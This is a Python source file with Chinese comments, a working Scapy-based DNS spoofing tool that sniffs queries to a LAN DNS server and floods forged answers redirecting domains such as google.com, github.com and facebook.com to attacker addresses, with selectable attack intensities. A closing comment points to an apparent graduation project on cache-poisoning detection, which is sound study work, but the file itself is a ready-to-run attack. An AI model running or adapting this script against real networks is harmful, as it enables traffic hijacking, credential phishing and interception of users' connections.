# dns_spoofer.py - 运行在Windows攻击端 192.168.10.13
from scapy.all import *
import time
import random

# ========== 配置区域（根据你的环境修改）==========
TARGET_IP = "192.168.10.11"      # 客户端IP（被攻击者）
DNS_SERVER_IP = "192.168.10.10"  # 真实DNS服务器IP

# 要欺骗的域名列表（你dnsmasq里配置的域名）
SPOOF_DOMAINS = [
    "google.com",
    "youtube.com", 
    "github.com",
    "stackoverflow.com",
    "wikipedia.org",
    "reddit.com",
    "amazon.com",
    "facebook.com",
    "twitter.com",
    "microsoft.com",
    "example.com"
]

# 攻击强度设置
ATTACK_MODE = "aggressive"  # 可选: "normal", "aggressive", "random"
# ================================================

def send_spoofed_response(packet):
    # 欺骗返回的IP（攻击端自己的IP）
    SPOOFED_IP = random.choice(["192.168.10.12", "192.168.10.13","192.168.10.14"])
    
    """发送伪造的DNS响应"""
    #SPOOFED_IP = "192.168.10.13"
    if packet.haslayer(DNSQR):  # 是DNS查询请求
        qname = packet[DNSQR].qname.decode('utf-8').rstrip('.')
        
        # 只欺骗我们指定的域名
        should_spoof = False
        for domain in SPOOF_DOMAINS:
            if domain in qname:
                should_spoof = True
                break
        
        if not should_spoof:
            return
        
        # 构造伪造的DNS响应
        ttl_value = random.randint(290, 310)  # 模拟正常TTL值
        spoofed_packet = IP(dst=packet[IP].src, src=DNS_SERVER_IP) / \
                         UDP(dport=packet[UDP].sport, sport=53) / \
                         DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                             an=DNSRR(rrname=qname, type='A', rdata=SPOOFED_IP, ttl=ttl_value))
        
        # 根据攻击模式决定发送次数
        if ATTACK_MODE == "aggressive":
            # 连续发送3次，确保覆盖真实响应
            for i in range(3):
                send(spoofed_packet, verbose=False)
                time.sleep(0.01)
            print(f"[ATTACK] 欺骗 {qname} -> {SPOOFED_IP} (x3)")
        elif ATTACK_MODE == "normal":
            send(spoofed_packet, verbose=False)
            print(f"[ATTACK] 欺骗 {qname} -> {SPOOFED_IP}")
        elif ATTACK_MODE == "random":
            # 随机发送1-5次
            count = random.randint(1, 5)
            for i in range(count):
                send(spoofed_packet, verbose=False)
                time.sleep(0.01)
            print(f"[ATTACK] 欺骗 {qname} -> {SPOOFED_IP} (x{count})")

def start_attack():
    """开始监听并欺骗"""
    print(f"DNS Spoofer 启动")
    print(f"目标客户端: {TARGET_IP}")
    print(f"伪装DNS服务器: {DNS_SERVER_IP}")
    print(f"欺骗域名: {SPOOF_DOMAINS}")
    print(f"攻击模式: {ATTACK_MODE}")
    print("开始监听DNS查询...\n")
    
    # 設定要監聽的網路介面
    interface = "乙太網路"
    # 过滤条件：只抓取发往真实DNS服务器的DNS查询
    filter_str = f"udp port 53 and ip dst {DNS_SERVER_IP}"
    
    # 开始嗅探
    sniff(
        iface=interface,
        filter=filter_str, 
        prn=send_spoofed_response, 
        store=0
    )

if __name__ == "__main__":
    # 需要管理员权限运行
    if os.name == 'nt':
        import ctypes
        if not ctypes.windll.shell32.IsUserAnAdmin():
            print("请以管理员权限运行此脚本！")
            print("在PowerShell中右键 -> 以管理员身份运行")
            exit(1)
    
    start_attack()


'''
cd "D:\VS code_programing\Python\畢業專題\Cache_detect"
python dns_spoofer.py

'''
